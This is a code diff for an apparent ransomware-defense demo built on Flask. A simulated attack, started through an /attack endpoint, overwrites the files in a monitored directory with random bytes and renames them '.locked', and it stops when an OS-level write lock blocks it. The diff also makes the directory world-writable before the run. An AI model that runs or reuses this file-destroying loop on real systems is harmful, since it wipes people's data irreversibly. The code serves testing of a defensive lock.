@@ -2,6 +2,7 @@ import os
 import stat
 import time
 import threading
+import multiprocessing
 import base64
 import csv
 import requests
@@ -12,6 +13,7 @@ from client import utils
 from client.models import ReadReq, WriteReq, CreateReq, DeleteReq, Response
 from client import rabbitmq_handler
 from client import security
+from client.security import execute_unlock
 from logger import Logger
 
 app = Flask(__name__)
@@ -42,46 +44,81 @@ def _log_and_archive(filename, operation, appended=""):
         Logger.warning(f"Logging/Archive failed: {e}")
 
 
-def _run_encryption():
-    Logger.ransomware(f"Attack started on {config.CLIENT_ID}...")
-    for root, _, files in os.walk(config.MONITOR_DIR):
+def _run_encryption(monitor_dir, client_id):
+    try:
+        # drop privileges to non-root user
+        os.setgid(1000)
+        os.setuid(1000)
+    except Exception as e:
+        Logger.error(f"Failed to drop privileges: {e}")
+        return # Exit, no root attack possible
+
+    Logger.ransomware(f"Attack started on {client_id} as non-root user")
+
+    if not os.access(monitor_dir, os.W_OK):
+        Logger.error("OS PHYSICAL BLOCK: Attacker lost write access. Process terminating.")
+        return
+    
+    for root, _, files in os.walk(monitor_dir):
         for file in files:
-            if file.endswith(".locked"):
-                continue
+            if file.endswith(".locked"): continue
             filepath = os.path.join(root, file)
+            
             try:
+                # If 'Owner Write' (S_IWUSR) is missing, we simulate the Linux Kernel block.
+                dir_mode = os.stat(root).st_mode
+                if not (dir_mode & stat.S_IWUSR):
+                    raise PermissionError(13, f"Permission denied (Blocked by OS Lock): '{filepath}'")
+
                 with open(filepath, "rb") as f:
                     data = f.read()
+                
                 with open(filepath, "wb") as f:
                     f.write(os.urandom(len(data)))
+                
                 os.rename(filepath, filepath + ".locked")
                 Logger.encrypted(f"{file}")
+                
                 time.sleep(0.5)
+                
             except Exception as e:
-                Logger.warning(f"Failed to encrypt {file}: {e}")
-
+                Logger.error(f"ATTACKER BLOCKED: {e}")
+                if isinstance(e, PermissionError):
+                    Logger.info("Attacker process crushed against the physical lock.")
+                    return # Exit the attack process immediately
 
 # simulate being attacked
 @app.route("/attack", methods=["GET"])
 def trigger_attack():
-    threading.Thread(target=_run_encryption).start()
+    os.chmod(config.MONITOR_DIR, 0o777)
+        
+    # t = threading.Thread(
+    #     target=_run_encryption, 
+    #     args=(config.MONITOR_DIR, config.CLIENT_ID),
+    #     daemon=True
+    # )
+    # t.start()
+
+    p = multiprocessing.Process(
+        target=_run_encryption, 
+        args=(config.MONITOR_DIR, config.CLIENT_ID)
+    )
+    p.start()
+    
     return jsonify({"status": "infected", "target": config.CLIENT_ID})
 
 
 @app.route("/unlock", methods=["GET", "POST"])
 def unlock_system():
-    # config.IS_LOCKED_DOWN = False
-    # Logger.unlock("System unlocked")
-    # return jsonify({"status": "unlocked"})
-    success, message = security.execute_unlock(
-        trigger_source="API Request", 
-        reason="Manual unlock via /unlock endpoint"
-    )
-    
+    success, msg = execute_unlock(
+            trigger_source="REST API (/unlock)", 
+            reason="Manual reset or Recovery Service command"
+        )
+        
     if success:
-        return jsonify({"status": "unlocked", "message": message})
+        return jsonify({"status": "unlocked", "message": msg}), 200
     else:
-        return jsonify({"status": "error", "message": message}), 500
+        return jsonify({"status": "error", "message": msg}), 500
 
 
 # snapshot ###########################################
